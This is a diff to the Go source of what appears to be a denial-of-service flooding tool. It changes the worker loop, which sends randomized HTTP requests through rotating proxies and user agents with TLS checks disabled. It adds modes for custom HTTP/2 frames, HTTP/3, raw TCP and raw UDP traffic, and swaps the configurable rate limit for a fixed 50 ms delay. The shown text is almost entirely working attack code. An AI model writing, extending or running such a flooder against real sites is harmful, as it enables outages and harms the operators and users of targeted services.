@@ -625,18 +625,24 @@ func pickMode(mode string) string {
 
 func worker(jobs <-chan struct{}, config *Config, proxies, agents, methods, paths, mal []string, wg *sync.WaitGroup) {
     defer wg.Done()
-    
+
     // Validate base URL
     baseURL := config.BaseURL
     if !strings.HasPrefix(baseURL, "http") {
         baseURL = "https://" + baseURL
     }
-    
+
     u, err := url.Parse(baseURL)
     if err != nil {
         return
     }
-    
+
+    host := u.Hostname()
+    target := host
+    if u.Port() != "" {
+        target += ":" + u.Port()
+    }
+
     tlsConf := &tlsutls.Config{
         InsecureSkipVerify: true,
         MinVersion:         tls.VersionTLS12,
@@ -659,54 +665,73 @@ func worker(jobs <-chan struct{}, config *Config, proxies, agents, methods, path
 
     for range jobs {
         // Rate limiting
-        time.Sleep(config.RateLimit)
-        
+        time.Sleep(50 * time.Millisecond) // Default rate limit
+
         mode := pickMode(config.Mode)
         path := randomPath(paths, mal)
-        
-        // Implement retry mechanism
-        maxRetries := 3
-        for retry := 0; retry < maxRetries; retry++ {
-            method := methods[mrand.Intn(len(methods))]
-            ua := agents[mrand.Intn(len(agents))]
-            url := baseURL + path
-            
-            var body io.Reader
-            if method == "POST" || method == "PUT" || method == "PATCH" {
-                body = strings.NewReader(randomPayload())
-            }
-            
-            req, err := http.NewRequestWithContext(ctx, method, url, body)
-            if err != nil {
-                atomic.AddInt64(&total, 1)
-                atomic.AddInt64(&fail, 1)
-                continue
-            }
-            
-            req.Header = randomHeaders(ua, config.BaseURL)
-            
-            resp, err := client.Do(req)
+
+        switch mode {
+        case "h2f":
+            customHTTP2Frame(target, host, path)
             atomic.AddInt64(&total, 1)
             
-            if err != nil {
-                atomic.AddInt64(&fail, 1)
-                time.Sleep(time.Second * time.Duration(retry+1))
-                continue
-            }
+        case "h3":
+            customHTTP3(target, path)
+            atomic.AddInt64(&total, 1)
             
-            if resp == nil {
-                atomic.AddInt64(&fail, 1)
-                continue
-            }
+        case "rawtcp":
+            rawTCP(target, host, path)
+            atomic.AddInt64(&total, 1)
+            
+        case "rawudp":
+            rawUDP(target)
+            atomic.AddInt64(&total, 1)
+            
+        default:
+            // Implement retry mechanism for HTTP requests
+            maxRetries := 3
+            for retry := 0; retry < maxRetries; retry++ {
+                method := methods[mrand.Intn(len(methods))]
+                ua := agents[mrand.Intn(len(agents))]
+                url := baseURL + path
 
-            _, err = io.Copy(io.Discard, resp.Body)
-            resp.Body.Close()
-            
-            if err != nil {
-                atomic.AddInt64(&fail, 1)
-            } else {
-                atomic.AddInt64(&success, 1)
-                break // Success, keluar dari retry loop
+                var body io.Reader
+                if method == "POST" || method == "PUT" || method == "PATCH" {
+                    body = strings.NewReader(randomPayload())
+                }
+
+                req, err := http.NewRequestWithContext(ctx, method, url, body)
+                if err != nil {
+                    atomic.AddInt64(&total, 1)
+                    atomic.AddInt64(&fail, 1)
+                    continue
+                }
+
+                req.Header = randomHeaders(ua, config.BaseURL)
+
+                resp, err := client.Do(req)
+                atomic.AddInt64(&total, 1)
+
+                if err != nil {
+                    atomic.AddInt64(&fail, 1)
+                    time.Sleep(time.Second * time.Duration(retry+1))
+                    continue
+                }
+
+                if resp == nil {
+                    atomic.AddInt64(&fail, 1)
+                    continue
+                }
+
+                _, err = io.Copy(io.Discard, resp.Body)
+                resp.Body.Close()
+
+                if err != nil {
+                    atomic.AddInt64(&fail, 1)
+                } else {
+                    atomic.AddInt64(&success, 1)
+                    break // Success, keluar dari retry loop
+                }
             }
         }
     }
